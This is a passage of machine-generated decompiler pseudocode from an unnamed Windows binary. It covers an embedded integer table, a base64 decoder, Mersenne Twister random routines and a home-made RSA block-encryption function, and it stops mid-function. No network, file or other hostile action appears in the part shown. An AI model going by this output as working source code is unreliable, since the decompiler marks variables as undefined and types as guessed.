  -1159242403,
  841685273,
  -426413197,
  -1063231392,
  429425025,
  -1630449841,
  -1551901476,
  1147544098,
  1417554474,
  1001099408,
  193169544,
  -1932900794,
  -953553170,
  1809037496,
  675025940,
  -1485185314,
  -1126015394,
  371002123,
  -1384719397,
  -616832800,
  1683370546,
  1951283770,
  337512970,
  -1831122615,
  201983494,
  1215046692,
  -1192993700,
  -1621245246,
  -1116810285,
  1139780780,
  -995728798,
  967348625,
  832869781,
  -751311644,
  -225740423,
  -718084121,
  -1958491960,
  1851340599,
  -625513107,
  25988493,
  -1318791723,
  -1663938994,
  1239460265,
  -659264404,
  -1392880042,
  -217582348,
  -819598614,
  -894474907,
  -191989126,
  1206496942,
  270010376,
  1876277946,
  -259491720,
  1248797989,
  1550986798,
  941890588,
  1475454630,
  1942467764,
  -1756248378,
  -886839064,
  -1585652259,
  -392399756,
  1042358047,
  -1763882165,
  1641856445,
  226921355,
  260409994,
  -527404944,
  2084716094,
  1908716981,
  -861247898,
  -1864873912,
  100991747,
  -150866186,
  470945294,
  -1029480095,
  1784624437,
  -1359390889,
  1775286713,
  395413126,
  -1722236479,
  975641885,
  666476190,
  -650583583,
  -351012616,
  733190296,
  573772049,
  -759469719,
  -1452221991,
  126455438,
  866620564,
  766942107,
  1008868894,
  361924487,
  -920589847,
  -2025206066,
  -1426107051,
  1350051880,
  -1518673953,
  59739276,
  1509466529,
  159418761,
  437718285,
  1708834751,
  -684595482,
  -2067381694,
  -793221016,
  -2101132991,
  699439513,
  1517759789,
  504434447,
  2076946608,
  -1459858348,
  1842789307,
  742004246
}; // weak
int dword_4185C8[] = { 1353184337 }; // weak
const wchar_t asc_418C50[] = L"\\"; // idb
void *std::bad_exception::`vftable' = &sub_410FDC; // weak
_UNKNOWN unk_419374; // weak
const _ThrowInfo _TI2_AVbad_alloc_std__ = { 0u, &sub_401000, NULL, &_CTA2_AVbad_alloc_std__ }; // idb
void *off_41B860 = &unk_41D040; // weak
HANDLE hObject = (HANDLE)0xFFFFFFFE; // idb
void *dword_41BEC8 = NULL; // idb
int dword_41BED8 = 0; // weak
int dword_41BEDC = 15; // weak
void *Buf = NULL; // idb
int dword_41BEF4 = 0; // weak
int dword_41BEF8 = 15; // weak
int dword_41BF30 = 1024; // weak
int dword_41BF34 = -1023; // weak
int dword_41BF38 = 53; // weak
int dword_41BF3C = 11; // weak
int dword_41BF40 = 64; // weak
int dword_41BF44 = 1023; // weak
int dword_41BF48 = 128; // weak
int dword_41BF4C = -127; // weak
int dword_41BF50 = 24; // weak
int dword_41BF54 = 8; // weak
int dword_41BF58 = 32; // weak
int dword_41BF5C = 127; // weak
_DWORD dword_41C240[3] = { 0, 0, 0 }; // weak
PVOID Target = NULL; // idb
PVOID dword_41C5BC; // idb
PVOID dword_41C5C0; // idb
PVOID dword_41C604; // idb
PVOID dword_41C610; // idb
PVOID dword_41C614; // idb
PVOID dword_41C618; // idb
PVOID dword_41C61C; // idb
PVOID dword_41C620; // idb
int dword_41CF04; // weak
int dword_41CF18; // weak
int dword_41E044; // weak


//----- (00401000) --------------------------------------------------------
void __thiscall sub_401000(std::exception *this)
{
  *(_DWORD *)this = &std::bad_alloc::`vftable';
  sub_406AA9(this);
}
// 41522C: using guessed type void *std::bad_alloc::`vftable';

//----- (00401010) --------------------------------------------------------
std::exception *__thiscall sub_401010(std::exception *this, char a2)
{
  *(_DWORD *)this = &std::bad_alloc::`vftable';
  sub_406AA9(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}
// 41522C: using guessed type void *std::bad_alloc::`vftable';

//----- (00401040) --------------------------------------------------------
int __cdecl sub_401040(int a1)
{
  _DWORD *v1; // ecx
  _DWORD *v2; // ebx
  int v3; // edx
  int v4; // esi
  int v5; // edi
  unsigned int v6; // eax
  _DWORD *v7; // ecx
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  int v10; // ecx
  int i; // esi
  __int16 v12; // kr00_2
  char v13; // dl
  char v14; // cl
  char v15; // al
  int v16; // ecx
  __int16 v17; // kr02_2
  signed int v18; // esi
  _DWORD *v20; // [esp+Ch] [ebp-38h]
  int Src; // [esp+14h] [ebp-30h] BYREF
  int v22; // [esp+18h] [ebp-2Ch]
  char v23; // [esp+1Ch] [ebp-28h] BYREF
  unsigned __int8 v24; // [esp+1Dh] [ebp-27h]
  unsigned __int8 v25; // [esp+1Eh] [ebp-26h]
  char v26; // [esp+1Fh] [ebp-25h]
  unsigned __int8 v27[4]; // [esp+20h] [ebp-24h] BYREF
  void *Buf[5]; // [esp+24h] [ebp-20h] BYREF
  unsigned int v29; // [esp+38h] [ebp-Ch]

  v2 = v1;
  v20 = v1;
  v29 = 15;
  Buf[4] = 0;
  LOBYTE(Buf[0]) = 0;
  sub_401330("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 0x40u, (int)Buf);
  v3 = 0;
  v4 = 0;
  v5 = 0;
  v22 = v2[4];
  Src = 0;
  if ( v22 )
  {
    while ( 1 )
    {
      v6 = v2[5];
      --v22;
      v7 = v6 < 0x10 ? v2 : (_DWORD *)*v2;
      if ( *((_BYTE *)v7 + v3) == 61 )
        break;
      v8 = v6 < 0x10 ? v2 : (_DWORD *)*v2;
      v27[0] = *((_BYTE *)v8 + v3);
      if ( !isalnum(v27[0]) && v27[0] != 43 && v27[0] != 47 )
        break;
      if ( v2[5] < 0x10u )
        v9 = v2;
      else
        v9 = (_DWORD *)*v2;
      v10 = Src;
      *(&v23 + v4++) = *((_BYTE *)v9 + Src);
      Src = v10 + 1;
      if ( v4 == 4 )
      {
        for ( i = 0; i < 4; ++i )
        {
          v27[0] = *(&v23 + i);
          *(&v23 + i) = sub_4012B0(v27, Buf);
        }
        v12 = v25 << 6;
        v13 = v26 + v12;
        v14 = (16 * v24) ^ HIBYTE(v12) & 0xF;
        v2 = v20;
        *(_BYTE *)(a1 + v5) = 4 * v23 + ((v24 >> 4) & 3);
        *(_BYTE *)(a1 + v5 + 1) = v14;
        *(_BYTE *)(a1 + v5 + 2) = v13;
        v5 += 3;
        v4 = 0;
      }
      if ( !v22 )
        break;
      v3 = Src;
    }
    if ( v4 )
    {
      if ( v4 < 4 )
        memset(&v23 + v4, 0, 4 - v4);
      v22 = 0;
      do
      {
        v27[0] = *(&v23 + v22);
        v15 = sub_4012B0(v27, Buf);
        v16 = v22;
        *(&v23 + v22) = v15;
        v22 = v16 + 1;
      }
      while ( v16 + 1 < 4 );
      LOBYTE(Src) = 4 * v23 + ((v24 >> 4) & 3);
      v17 = v25 << 6;
      v18 = v4 - 1;
      BYTE1(Src) = (16 * v24) ^ HIBYTE(v17) & 0xF;
      BYTE2(Src) = v26 + v17;
      if ( v18 > 0 )
      {
        memcpy_0((void *)(v5 + a1), &Src, v18);
        v5 += v18;
      }
    }
  }
  if ( v29 >= 0x10 )
    operator delete(Buf[0]);
  return v5;
}
// 401056: variable 'v1' is possibly undefined
// 401040: using guessed type unsigned __int8 var_24[4];

//----- (00401240) --------------------------------------------------------
int __usercall sub_401240@<eax>(const void *a1@<eax>, int a2@<ecx>)
{
  *(_DWORD *)(a2 + 20) = 15;
  *(_DWORD *)(a2 + 16) = 0;
  *(_BYTE *)a2 = 0;
  sub_401330(a1, strlen((const char *)a1), a2);
  return a2;
}

//----- (004012B0) --------------------------------------------------------
int __userpurge sub_4012B0@<eax>(unsigned __int8 *a1@<ebx>, _DWORD *Buf)
{
  _DWORD *v2; // esi
  size_t v3; // edi
  unsigned __int8 *v4; // eax
  int v5; // ecx
  unsigned __int8 *v7; // ecx

  v2 = Buf;
  v3 = Buf[4];
  if ( !v3 )
    return -1;
  if ( Buf[5] >= 0x10u )
    v2 = (_DWORD *)*Buf;
  v4 = (unsigned __int8 *)memchr(v2, (char)*a1, Buf[4]);
  if ( !v4 )
    return -1;
  while ( 1 )
  {
    v5 = *v4 - *a1;
    if ( !v5 || !((v5 >> 31) | 1) )
      break;
    v3 = v3 + (char *)v2 - (char *)v4 - 1;
    v2 = v4 + 1;
    v4 = (unsigned __int8 *)memchr(v4 + 1, (char)*a1, v3);
    if ( !v4 )
      return -1;
  }
  v7 = (unsigned __int8 *)Buf;
  if ( Buf[5] >= 0x10u )
    v7 = (unsigned __int8 *)*Buf;
  return v4 - v7;
}

//----- (00401330) --------------------------------------------------------
const void **__usercall sub_401330@<eax>(const void *a1@<eax>, unsigned int a2@<edi>, int a3@<esi>)
{
  unsigned int v4; // ecx
  unsigned int v5; // eax
  int v6; // eax
  const void **result; // eax
  unsigned int v8; // eax
  void *v9; // eax
  bool v10; // cf

  if ( a1 )
  {
    v4 = *(_DWORD *)(a3 + 20);
    v5 = v4 < 0x10 ? a3 : *(_DWORD *)a3;
    if ( (unsigned int)a1 >= v5 )
    {
      v6 = v4 < 0x10 ? a3 : *(_DWORD *)a3;
      if ( v6 + *(_DWORD *)(a3 + 16) > (unsigned int)a1 )
      {
        if ( v4 < 0x10 )
          return sub_401400((const void **)a3, a2, (unsigned int)a1 - a3, (const void **)a3);
        else
          return sub_401400((const void **)a3, a2, (unsigned int)a1 - *(_DWORD *)a3, (const void **)a3);
      }
    }
  }
  if ( a2 == -1 )
    std::_Xlength_error("string too long");
  v8 = *(_DWORD *)(a3 + 20);
  if ( v8 < a2 )
  {
    sub_4014E0((const void **)a3, a2, *(_DWORD *)(a3 + 16));
    if ( !a2 )
      return (const void **)a3;
LABEL_17:
    if ( *(_DWORD *)(a3 + 20) < 0x10u )
      v9 = (void *)a3;
    else
      v9 = *(void **)a3;
    memcpy_0(v9, a1, a2);
    v10 = *(_DWORD *)(a3 + 20) < 0x10u;
    *(_DWORD *)(a3 + 16) = a2;
    if ( !v10 )
    {
      *(_BYTE *)(*(_DWORD *)a3 + a2) = 0;
      return (const void **)a3;
    }
    *(_BYTE *)(a3 + a2) = 0;
    return (const void **)a3;
  }
  if ( a2 )
    goto LABEL_17;
  *(_DWORD *)(a3 + 16) = 0;
  if ( v8 < 0x10 )
  {
    result = (const void **)a3;
    *(_BYTE *)a3 = 0;
  }
  else
  {
    **(_BYTE **)a3 = 0;
    return (const void **)a3;
  }
  return result;
}

//----- (00401400) --------------------------------------------------------
const void **__userpurge sub_401400@<eax>(
        const void **a1@<ecx>,
        unsigned int a2@<eax>,
        unsigned int a3@<ebx>,
        const void **a4)
{
  const void **v5; // ecx
  unsigned int v6; // edi
  unsigned int v7; // edi
  const void **result; // eax
  unsigned int v9; // eax
  void *v10; // eax
  bool v11; // cf

  v5 = a4;
  v6 = (unsigned int)a4[4];
  if ( v6 < a3 )
    std::_Xout_of_range("invalid string position");
  v7 = v6 - a3;
  if ( a2 < v7 )
    v7 = a2;
  if ( a1 == a4 )
  {
    sub_401650(0xFFFFFFFF, v7 + a3, a1);
    sub_401650(a3, 0, a1);
    return a1;
  }
  if ( v7 == -1 )
    std::_Xlength_error("string too long");
  v9 = (unsigned int)a1[5];
  if ( v9 < v7 )
  {
    sub_4014E0(a1, v7, (size_t)a1[4]);
    v5 = a4;
    if ( !v7 )
      return a1;
LABEL_11:
    if ( (unsigned int)v5[5] >= 0x10 )
      v5 = (const void **)*v5;
    if ( (unsigned int)a1[5] < 0x10 )
      v10 = a1;
    else
      v10 = (void *)*a1;
    memcpy_0(v10, (char *)v5 + a3, v7);
    v11 = (unsigned int)a1[5] < 0x10;
    a1[4] = (const void *)v7;
    if ( !v11 )
    {
      *((_BYTE *)*a1 + v7) = 0;
      return a1;
    }
    *((_BYTE *)a1 + v7) = 0;
    return a1;
  }
  if ( v7 )
    goto LABEL_11;
  a1[4] = 0;
  if ( v9 < 0x10 )
  {
    result = a1;
    *(_BYTE *)a1 = 0;
  }
  else
  {
    *(_BYTE *)*a1 = 0;
    return a1;
  }
  return result;
}

//----- (004014E0) --------------------------------------------------------
void *__stdcall sub_4014E0(const void **a1, unsigned int a2, size_t Size)
{
  int v3; // edi
  unsigned int v4; // esi
  unsigned int v5; // ebx
  unsigned int v6; // ecx
  void *v7; // eax
  const void *v8; // eax
  void *result; // eax
  int v10; // [esp+0h] [ebp-34h] BYREF
  int pExceptionObject[3]; // [esp+10h] [ebp-24h] BYREF
  char *v12[5]; // [esp+20h] [ebp-14h] BYREF
  void *v13; // [esp+40h] [ebp+Ch]

  v12[1] = (char *)&v10;
  v3 = (int)a1;
  v4 = a2 | 0xF;
  if ( (a2 | 0xF) == -1 )
  {
    v4 = a2;
  }
  else
  {
    v5 = (unsigned int)a1[5];
    v6 = v5 >> 1;
    if ( v5 >> 1 > v4 / 3 )
    {
      v4 = v6 + v5;
      if ( v5 > -2 - v6 )
        v4 = -2;
    }
  }
  v7 = 0;
  v12[4] = 0;
  if ( v4 != -1 )
  {
    v7 = operator new(v4 + 1);
    if ( !v7 )
    {
      v12[0] = 0;
      std::exception::exception((std::exception *)pExceptionObject, (const char *const *)v12);
      pExceptionObject[0] = (int)&std::bad_alloc::`vftable';
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
  }
  v13 = v7;
  if ( Size )
  {
    if ( (unsigned int)a1[5] < 0x10 )
      v8 = a1;
    else
      v8 = *a1;
    memcpy_0(v13, v8, Size);
  }
  if ( (unsigned int)a1[5] >= 0x10 )
    operator delete((void *)*a1);
  result = v13;
  *(_BYTE *)a1 = 0;
  *a1 = v13;
  a1[5] = (const void *)v4;
  a1[4] = (const void *)Size;
  if ( v4 >= 0x10 )
    v3 = (int)v13;
  *(_BYTE *)(v3 + Size) = 0;
  return result;
}
// 41522C: using guessed type void *std::bad_alloc::`vftable';

//----- (00401650) --------------------------------------------------------
_DWORD *__usercall sub_401650@<eax>(unsigned int a1@<eax>, unsigned int a2@<ecx>, _DWORD *a3@<esi>)
{
  unsigned int v4; // eax
  unsigned int v5; // eax
  unsigned int v6; // edx
  _DWORD *v7; // ebx
  _DWORD *v8; // edx
  unsigned int v9; // eax
  bool v10; // cf

  v4 = a3[4];
  if ( v4 < a2 )
    std::_Xout_of_range("invalid string position");
  v5 = v4 - a2;
  if ( v5 < a1 )
    a1 = v5;
  if ( a1 )
  {
    v6 = a3[5];
    if ( v6 < 0x10 )
      v7 = a3;
    else
      v7 = (_DWORD *)*a3;
    if ( v6 < 0x10 )
      v8 = a3;
    else
      v8 = (_DWORD *)*a3;
    memcpy((char *)v8 + a2, (char *)v7 + a2 + a1, v5 - a1);
    v9 = a3[4] - a1;
    v10 = a3[5] < 0x10u;
    a3[4] = v9;
    if ( !v10 )
    {
      *(_BYTE *)(*a3 + v9) = 0;
      return a3;
    }
    *((_BYTE *)a3 + v9) = 0;
  }
  return a3;
}

//----- (004016C0) --------------------------------------------------------
void *__thiscall sub_4016C0(size_t Size)
{
  void *result; // eax
  int pExceptionObject[3]; // [esp+0h] [ebp-10h] BYREF
  char *v3; // [esp+Ch] [ebp-4h] BYREF

  result = 0;
  if ( Size )
  {
    result = operator new(Size);
    if ( !result )
    {
      v3 = 0;
      std::exception::exception((std::exception *)pExceptionObject, (const char *const *)&v3);
      pExceptionObject[0] = (int)&std::bad_alloc::`vftable';
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
    }
  }
  return result;
}
// 41522C: using guessed type void *std::bad_alloc::`vftable';

//----- (00401710) --------------------------------------------------------
std::exception *__thiscall sub_401710(std::exception *this, struct exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::bad_alloc::`vftable';
  return this;
}
// 41522C: using guessed type void *std::bad_alloc::`vftable';

//----- (00401730) --------------------------------------------------------
unsigned int __stdcall sub_401730(unsigned int a1, unsigned int a2)
{
  unsigned int v2; // ecx
  int i; // eax
  std::tr1 *v5; // [esp+0h] [ebp-1398h]
  int v6; // [esp+8h] [ebp-1390h] BYREF
  int v7[1250]; // [esp+Ch] [ebp-138Ch]

  v7[0] = std::tr1::_Random_device(v5);
  v2 = v7[0];
  v7[1248] = -1;
  for ( i = 1; i < 624; ++i )
  {
    v2 = i + 1812433253 * ((v2 >> 30) ^ v2);
    v7[i] = v2;
  }
  v6 = 624;
  return sub_401E20(a1, a2, &v6);
}
// 401748: variable 'v5' is possibly undefined

//----- (004017B0) --------------------------------------------------------
char *__cdecl sub_4017B0(char *a1)
{
  int v1; // ecx
  unsigned __int8 *v2; // ebx
  int v3; // eax
  int v4; // edx
  int v5; // edi
  int v6; // edi
  void *v7; // eax
  int v8; // ecx
  unsigned int v9; // esi
  void *v10; // ecx
  unsigned int v11; // eax
  const void *v12; // edx
  char *v13; // esi
  int v14; // eax
  int v15; // ecx
  _DWORD *v16; // eax
  char *v17; // edx
  int v18; // eax
  int v19; // ecx
  char *v20; // edi
  _DWORD *v21; // eax
  int v23[202]; // [esp+10h] [ebp-CB4h] BYREF
  int v24[202]; // [esp+338h] [ebp-98Ch] BYREF
  void *v25; // [esp+660h] [ebp-664h]
  void *i; // [esp+664h] [ebp-660h]
  char *j; // [esp+668h] [ebp-65Ch]
  int v28; // [esp+66Ch] [ebp-658h]
  char v29[804]; // [esp+670h] [ebp-654h] BYREF
  char v30[804]; // [esp+994h] [ebp-330h] BYREF

  j = a1;
  v2 = (unsigned __int8 *)operator new[](*(_DWORD *)(v1 + 16));
  v3 = sub_401040((int)v2);
  v4 = v2[2];
  v5 = (v2[1] | (*v2 << 8)) << 8;
  v28 = v3;
  v6 = v2[3] | ((v4 | v5) << 8);
  v7 = operator new[](v6);
  v8 = 0;
  for ( i = v7; v8 < v6; ++v8 )
    *((_BYTE *)v7 + v8) = v2[v8 + 4];
  v28 -= v6;
  v9 = v28 - 4;
  v10 = operator new[](v28 - 4);
  v11 = 0;
  v25 = v10;
  if ( v28 != 4 )
  {
    do
    {
      *((_BYTE *)v10 + v11) = v2[v6 + 4 + v11];
      ++v11;
    }
    while ( v11 < v9 );
  }
  sub_402160(v28 - 4, v24, (unsigned __int8 *)v10);
  sub_402160(v6, v23, (unsigned __int8 *)i);
  qmemcpy(v29, v12, sizeof(v29));
  qmemcpy(v30, v24, sizeof(v30));
  v13 = j;
  memset(j + 4, 0, 0x320u);
  v14 = v23[0];
  v15 = 0;
  *(_DWORD *)v13 = v23[0];
  if ( v14 > 0 )
  {
    v16 = v13 + 4;
    do
    {
      *v16 = *(_DWORD *)((char *)v16 + v29 - v13);
      ++v15;
      ++v16;
    }
    while ( v15 < *(_DWORD *)v13 );
  }
  v17 = v13 + 804;
  memset(v13 + 808, 0, 0x320u);
  v18 = v24[0];
  v19 = 0;
  *((_DWORD *)v13 + 201) = v24[0];
  if ( v18 > 0 )
  {
    v20 = (char *)(v30 - v17);
    v21 = v13 + 808;
    for ( j = (char *)(v30 - v17); ; v20 = j )
    {
      *v21 = *(_DWORD *)((char *)v21 + (_DWORD)v20);
      ++v19;
      ++v21;
      if ( v19 >= *(_DWORD *)v17 )
        break;
    }
  }
  operator delete[](v2);
  operator delete[](i);
  operator delete[](v25);
  return v13;
}
// 4017D0: variable 'v1' is possibly undefined
// 4018B5: variable 'v12' is possibly undefined
// 4017B0: using guessed type int var_CB4[202];

//----- (00401980) --------------------------------------------------------
char *__usercall sub_401980@<eax>(int *a1@<eax>, char *a2@<esi>)
{
  int v3; // eax
  int v4; // ecx
  _DWORD *v5; // eax
  char *v6; // edx
  int *v7; // ebx
  int v8; // eax
  int v9; // ecx
  _DWORD *v10; // eax
  int v11; // ebx

  *(_DWORD *)a2 = 0;
  memset(a2 + 4, 0, 0x320u);
  v3 = *a1;
  v4 = 0;
  *(_DWORD *)a2 = *a1;
  if ( v3 > 0 )
  {
    v5 = a2 + 4;
    do
    {
      *v5 = *(_DWORD *)((char *)v5 + (char *)a1 - a2);
      ++v4;
      ++v5;
    }
    while ( v4 < *(_DWORD *)a2 );
  }
  v6 = a2 + 804;
  *((_DWORD *)a2 + 201) = 0;
  v7 = a1 + 201;
  memset(a2 + 808, 0, 0x320u);
  v8 = *v7;
  v9 = 0;
  *((_DWORD *)a2 + 201) = *v7;
  if ( v8 > 0 )
  {
    v10 = a2 + 808;
    v11 = (char *)v7 - v6;
    do
    {
      *v10 = *(_DWORD *)((char *)v10 + v11);
      ++v9;
      ++v10;
    }
    while ( v9 < *(_DWORD *)v6 );
  }
  return a2;
}

//----- (00401A00) --------------------------------------------------------
int __cdecl sub_401A00(int a1, unsigned int a2, int a3, int a4)
{
  int v4; // ecx
  _BYTE *v5; // ebx
  int v6; // esi
  _BYTE *v7; // edi
  int v8; // esi
  int result; // eax
  unsigned int v10; // edi
  unsigned int v11; // ecx
  int i; // eax
  unsigned int v13; // ecx
  bool v14; // sf
  double v15; // st7
  double v16; // st6
  unsigned int v17; // ebx
  _BYTE *v18; // ecx
  unsigned int v19; // esi
  unsigned int v20; // eax
  _BYTE *v21; // ecx
  int v22; // eax
  _DWORD *v23; // ecx
  int v24; // eax
  int *v25; // ecx
  int v26; // esi
  _BYTE *v27; // ebx
  int v28; // esi
  int v29; // ebx
  int v30; // edi
  int v31; // edi
  int v32; // eax
  int v33; // [esp-648h] [ebp-2060h] BYREF
  int v34[200]; // [esp-644h] [ebp-205Ch] BYREF
  int v35; // [esp-324h] [ebp-1D3Ch] BYREF
  _BYTE v36[800]; // [esp-320h] [ebp-1D38h] BYREF
  std::tr1 *v37; // [esp+0h] [ebp-1A18h]
  double v38; // [esp+10h] [ebp-1A08h]
  int v39; // [esp+1Ch] [ebp-19FCh]
  int v40; // [esp+20h] [ebp-19F8h]
  int v41; // [esp+24h] [ebp-19F4h]
  unsigned int v42; // [esp+28h] [ebp-19F0h]
  int v43; // [esp+2Ch] [ebp-19ECh]
  void *v44; // [esp+30h] [ebp-19E8h]
  char v45; // [esp+37h] [ebp-19E1h]
  int v46; // [esp+38h] [ebp-19E0h] BYREF
  int v47[1248]; // [esp+3Ch] [ebp-19DCh]
  int v48; // [esp+13BCh] [ebp-65Ch]
  int v49[202]; // [esp+13C0h] [ebp-658h] BYREF
  int v50[203]; // [esp+16E8h] [ebp-330h] BYREF

  v5 = (_BYTE *)v4;
  v6 = 4 * a3;
  v40 = v4;
  v7 = operator new[](4 * a3);
  v8 = sub_4043C0(&a3, v7, v6);
  v39 = v8;
  operator delete[](v7);
  result = 0;
  v10 = 0;
  v42 = 0;
  v41 = 0;
  if ( a2 )
  {
    v38 = 4294967295.0 - 0.0 + 1.0;
    while ( 1 )
    {
      if ( v8 - 1 > (int)(a2 - v10) )
        v43 = a2 - v10;
      else
        v43 = v8 - 1;
      v47[0] = std::tr1::_Random_device(v37);
      v11 = v47[0];
      v48 = -1;
      for ( i = 1; i < 624; ++i )
      {
        v11 = i + 1812433253 * ((v11 >> 30) ^ v11);
        v47[i] = v11;
      }
      v46 = 624;
      sub_402010((int)&v46);
      v13 = (((((v48 & ((unsigned int)v47[v46] >> 11) ^ v47[v46]) & 0xFF3A58AD) << 7) ^ v48 & ((unsigned int)v47[v46] >> 11) ^ v47[v46]) & 0xFFFFDF8C) << 15;
      v14 = ((((v13 ^ (((v48 & ((unsigned int)v47[v46] >> 11) ^ v47[v46]) & 0xFF3A58AD) << 7) ^ v48 & ((unsigned int)v47[v46] >> 11) ^ v47[v46]) >> 18) ^ v13 ^ (((v48 & ((unsigned int)v47[v46] >> 11) ^ v47[v46]) & 0xFF3A58AD) << 7) ^ v48 & ((unsigned int)v47[v46] >> 11) ^ v47[v46]) & 0x80000000) != 0;
      v44 = (void *)(((v13 ^ (((v48 & ((unsigned int)v47[v46] >> 11) ^ v47[v46]) & 0xFF3A58AD) << 7) ^ v48 & ((unsigned int)v47[v46] >> 11) ^ v47[v46]) >> 18) ^ v13 ^ (((v48 & ((unsigned int)v47[v46] >> 11) ^ v47[v46]) & 0xFF3A58AD) << 7) ^ v48 & ((unsigned int)v47[v46] >> 11) ^ v47[v46]);
      v15 = (double)(int)v44;
      if ( v14 )
        v15 = v15 + 4294967296.0;
      v16 = v15 / v38 * 255.0 + 1.0;
      if ( v16 < 255.0 )
      {
        v17 = v43 + 1;
        v44 = (void *)(int)v16;
        v45 = (int)v16;
      }
      else
      {
        v45 = -1;
        v17 = v43 + 1;
      }
      while ( 1 )
      {
        v18 = operator new[](v17);
        v19 = v10 + v17 - 1;
        v44 = v18;
        *v18 = v45;
        v20 = v10;
        if ( v10 < v19 )
        {
          v21 = v18 + 1;
          do
          {
            *v21 = *(_BYTE *)(v20 + a1);
            ++v20;
            ++v21;
          }
          while ( v20 < v19 );
          v18 = v44;
        }
        qmemcpy(v50, sub_402160(v17, v49, v18), 0x324u);
        if ( !sub_402BF0((char *)&a3, (char *)v50) )
          break;
        operator delete[](v44);
        --v17;
        if ( --v43 <= 0 )
          _wassert(L"blockSize > 0", L"Crypto\\rsa.cpp", 0x4Fu);
        v10 = v42;
      }
      v42 += v43;
      memset(v36, 0, sizeof(v36));
      v35 = a3;
      v22 = 0;
      v43 = (int)&v35;
      if ( a3 > 0 )
      {
        v23 = v36;
        do
          *v23++ = *(&a4 + v22++);
        while ( v22 < v35 );
      }
      v33 = 0;
      v24 = 0;
      memset(v34, 0, sizeof(v34));
      v33 = STACK[0x1D4C];
      v43 = (int)&v33;
      if ( (int)STACK[0x1D4C] > 0 )
      {
        v25 = v34;
        do
          *v25++ = *(&STACK[0x1D50] + v24++);
        while ( v24 < v33 );
      }
      qmemcpy(
        v50,
        sub_403930(
          v50,
          v49,
          v33,
          v34[0],
          v34[1],
          v34[2],
          v34[3],
          v34[4],
          v34[5],
          v34[6],
          v34[7],
          v34[8],
          v34[9],
          v34[10],
          v34[11],
          v34[12],
          v34[13],
          v34[14],
          v34[15],
          v34[16],
          v34[17],
          v34[18],
          v34[19],
          v34[20],
          v34[21],
          v34[22],
          v34[23],
          v34[24],
          v34[25],
          v34[26],
          v34[27],
          v34[28],
          v34[29],
          v34[30],
          v34[31],
          v34[32],
          v34[33],
          v34[34],
          v34[35],
          v34[36],
          v34[37],
          v34[38],
          v34[39],
          v34[40],
          v34[41],
          v34[42],
          v34[43],
          v34[44],
          v34[45],
          v34[46],
          v34[47],
          v34[48],
          v34[49],
          v34[50],
          v34[51],
          v34[52],
          v34[53],
          v34[54],
          v34[55],
          v34[56],
          v34[57],
          v34[58],
          v34[59]),
        0x324u);
      operator delete[](v44);
      v26 = 4 * v50[0];
      v27 = operator new[](4 * v50[0]);
      v44 = v27;
      v28 = sub_4043C0(v50, v27, v26);
      if ( v28 < v39 )
      {
        v29 = v39 - v28;
        if ( v39 - v28 > 0 )
        {
          v30 = v41;
          memset((void *)(v41 + v40), 0, v39 - v28);
          v31 = v29 + v30;
          v27 = v44;
          v41 = v31;
          goto LABEL_33;
        }
        v27 = v44;
      }
      v31 = v41;
LABEL_33:
      v32 = 0;
      if ( v28 > 0 )
      {
        do
          *(_BYTE *)(v40 + v31++) = v27[v32++];
        while ( v32 < v28 );
        v41 = v31;
      }
      operator delete[](v27);
      if ( v42 >= a2 )
      {
        result = v41;
        *(_BYTE *)(v40 + v41) = 0;
        return result;
      }
      v10 = v42;
      v8 = v39;
    }
  }
  *v5 = 0;
  return result;
}
// 401A1F: variable 'v4' is possibly undefined
// 401A00: using guessed type int var_19DC[1248];
// 401A00: using guessed type int var_658[202];

//----- (00401E20) --------------------------------------------------------
unsigned int __userpurge sub_401E20@<eax>(unsigned int a1@<ecx>, unsigned int a2@<esi>, _DWORD *a3)
{
  double v3; // st6
  double v4; // st7

  v3 = (double)a2;
  v4 = sub_401EB0(0, a3, 1.0) * (v3 - (double)a1 + 1.0) + (double)a1;
  if ( v3 > v4 )
    return (__int64)v4;
  else
    return a2;
}

//----- (00401EB0) --------------------------------------------------------
double __usercall sub_401EB0@<st0>(unsigned int a1@<eax>, _DWORD *a2@<ecx>, double a3)
{
  unsigned int v5; // eax
  int v6; // edx
  unsigned int v7; // eax

  if ( *a2 == 624 )
  {
    sub_402010((int)a2);
  }
  else if ( *a2 >= 0x4E0u )
  {
    sub_401F50(a2);
  }
  v5 = a2[*a2 + 1];
  v6 = a2[1249];
  ++*a2;
  v7 = ((((v5 >> 11) & v6 ^ v5) & 0xFF3A58AD) << 7) ^ (v5 >> 11) & v6 ^ v5;
  return (double)((((v7 & 0xFFFFDF8C) << 15) ^ v7 ^ ((((v7 & 0xFFFFDF8C) << 15) ^ v7) >> 18)) - a1)
       / (4294967295.0 - (double)a1 + a3);
}

//----- (00401F50) --------------------------------------------------------
unsigned int __usercall sub_401F50@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // ecx
  int v2; // edi
  _DWORD *v3; // ecx
  int v4; // edi
  unsigned int result; // eax

  v1 = a1 + 625;
  v2 = 227;
  do
  {
    *(v1 - 624) = ((*v1 ^ (*v1 ^ v1[1]) & 0x7FFFFFFFu) >> 1) ^ v1[397] ^ ((v1[1] & 1) != 0 ? 0x9908B0DF : 0);
    ++v1;
    --v2;
  }
  while ( v2 );
  v3 = a1 + 852;
  v4 = 396;
  do
  {
    *(v3 - 624) = ((*v3 ^ (v3[1] ^ *v3) & 0x7FFFFFFFu) >> 1) ^ *(v3 - 851) ^ ((v3[1] & 1) != 0 ? 0x9908B0DF : 0);
    ++v3;
    --v4;
  }
  while ( v4 );
  result = (a1[1248] ^ (a1[1] ^ a1[1248]) & 0x7FFFFFFFu) >> 1;
  a1[624] = result ^ a1[397] ^ ((a1[1] & 1) != 0 ? 0x9908B0DF : 0);
  *a1 = 0;
  return result;
}

//----- (00402010) --------------------------------------------------------
_DWORD *__usercall sub_402010@<eax>(int a1@<eax>)
{
  _DWORD *result; // eax
  int v2; // edx
  int v3; // esi
  int v4; // edi
  int v5; // esi
  int v6; // edi
  unsigned int v7; // ecx

  result = (_DWORD *)(a1 + 1592);
  v2 = 104;
  do
  {
    v3 = *(result - 396);
